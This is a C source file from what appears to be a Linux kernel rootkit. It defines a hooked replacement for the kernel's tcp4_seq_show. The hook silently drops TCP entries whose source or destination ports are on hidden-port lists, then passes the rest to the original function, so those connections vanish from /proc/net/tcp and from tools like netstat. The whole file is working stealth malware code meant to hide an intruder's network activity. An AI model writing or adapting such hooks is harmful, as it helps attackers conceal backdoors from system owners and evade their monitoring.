#include <linux/stddef.h>
#include <linux/version.h>

/* include */
#include "type.h"
#include "debug.h"

/* hook */
#include "sym_map.h"

/* logic */
#include "hidden.h"

/* hooked */
#include "tcp4_seq_show.h"

int m_tcp4_seq_show(struct seq_file *seq, void *v)
{
        struct tcp_iter_state *st;
        struct sock *sk = v;

        DEBUG("shini :: m_tcp4_seq_show, called!\n");
        if (v == SEQ_START_TOKEN)
                goto out;

        st = seq->private;

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 4, 0)

        switch (st->state) {

        case TCP_SEQ_STATE_LISTENING:
        case TCP_SEQ_STATE_ESTABLISHED:
                if (sk->sk_state == TCP_TIME_WAIT) {
                        if (hidden_tcp_timewait(v, LIST_HT4_PORT_S,
                                                   LIST_HT4_PORT_D))
                                return 0;
                }
                else
                        if (hidden_tcp_port(v, LIST_HT4_PORT_S,
                                               LIST_HT4_PORT_D))
                                return 0;
                break;

        case TCP_SEQ_STATE_OPENREQ:
                break;
        }

#else
        if (sk->sk_state == TCP_TIME_WAIT) {
                if (hidden_tcp_timewait(v, LIST_HT4_PORT_S,
                                           LIST_HT4_PORT_D))
                        return 0;
        }
        else if (sk->sk_state == TCP_NEW_SYN_RECV)
                goto out;
        else
                if (hidden_tcp_port(v, LIST_HT4_PORT_S,
                                       LIST_HT4_PORT_D))
                        return 0;
#endif

 out:
        return sym_map.old->tcp4_seq_show(seq, v);
}

